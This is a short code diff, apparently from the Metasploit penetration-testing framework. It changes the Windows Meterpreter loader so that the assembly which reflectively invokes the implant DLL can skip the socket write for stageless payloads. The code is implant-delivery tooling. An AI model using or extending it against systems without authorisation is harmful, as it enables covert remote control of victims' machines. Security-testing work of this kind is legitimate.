@@ -50,7 +50,15 @@ module Payload::Windows::MeterpreterLoader
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
           ; offset from ReflectiveLoader() to the end of the DLL
           add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
+    ^
+
+    unless opts[:stageless]
+      asm << %Q^
           mov [ebx], edi        ; write the current socket to the config
+      ^
+    end
+
+    asm << %Q^
           push ebx              ; push the pointer to the configuration start
           push 4                ; indicate that we have attached
           push eax              ; push some arbitrary value for hInstance
@@ -58,13 +66,14 @@ module Payload::Windows::MeterpreterLoader
     ^
   end
 
-  def stage_meterpreter
+  def stage_meterpreter(stageless=false)
     # Exceptions will be thrown by the mixin if there are issues.
     dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x86.dll'))
 
     asm_opts = {
       :rdi_offset => offset,
-      :length     => dll.length
+      :length     => dll.length,
+      :stageless  => stageless
     }
 
     asm = asm_invoke_metsrv(asm_opts)
